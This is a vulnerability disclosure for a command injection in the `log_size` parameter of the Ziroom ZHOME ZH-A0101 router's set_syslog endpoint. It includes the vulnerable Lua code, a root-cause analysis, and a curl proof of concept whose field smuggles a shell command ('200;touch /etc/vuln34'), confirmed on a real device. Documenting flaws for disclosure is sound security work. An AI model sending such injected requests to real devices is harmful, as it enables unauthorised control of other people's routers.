# Command Injection Vulnerability in ZHOME ZH-A0101 set_syslog via `log_size`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/set_syslog`
- **Affected Parameter:** `log_size`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical
- **Special Note:** Same function as VULN-33, but a different parameter and command line.

## Vulnerability Information

| Item               | Detail                                          |
| ------------------ | ----------------------------------------------- |
| File               | `usr/lib/lua/luci/controller/api/zrNetwork.lua` |
| Function           | `set_syslog()`                                  |
| Code Location      | line 1181-1216                                  |
| Injection Location | `zrNetwork.lua:1208`                            |
| Sink               | `luci.sys.call()`                               |

## Vulnerable Code

<img width="1680" height="735" alt="image" src="https://github.com/user-attachments/assets/d9c09f41-433b-443d-9f9e-af7383a6a358" />


```lua
local log_size = LuciHttp.formvalue("log_size") or "200"

-- ...

luci.sys.call("uci set system.@system[0].log_size="..log_size.." > /dev/null")
```

## Root Cause

The `log_size` value is concatenated into a shell command:

```sh
uci set system.@system[0].log_size=<log_size> > /dev/null
```

No numeric validation or shell escaping is applied.

## Source-to-Sink Chain

```text
POST /api/ZRnetwork/set_syslog
    |
    v
LuciHttp.formvalue("log_size")
    |
    v
luci.sys.call("uci set system.@system[0].log_size=" .. log_size .. " > /dev/null")
    |
    v
/bin/sh
    |
    v
ZRWan.rebootSys()
```

## Harmless Verification Example

```bash
curl -s --noproxy "*" --max-time 5 -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200;touch /etc/vuln34" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"
```

## Impact

An authenticated attacker can execute commands before the device reboots. Because `/etc` is persistent in the verified environment, this can leave persistent artifacts.



## Injection Principle

Identical to VULN-33. The only difference is that the injection parameter is `log_size` instead of `conloglevel`.

Injection request:

```text
log_size = "200;touch /etc/vuln34"
```

Concatenated command:

```sh
uci set system.@system[0].log_size=200;touch /etc/vuln34 > /dev/null
```

## Proof of Concept

```bash
# Create persistent file
curl -s --noproxy "*" --max-time 5 -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200;touch /etc/vuln34" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"
```

## Real Device Verification

```text
Request:  POST /api/ZRnetwork/set_syslog  log_size=200;touch /etc/vuln34
Response: (device reboot)
SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:51 /etc/vuln34  ✅ (persists after reboot)
```

<img width="1997" height="216" alt="image" src="https://github.com/user-attachments/assets/6f3005de-78b5-4d87-9569-fd1d22d4bcba" />
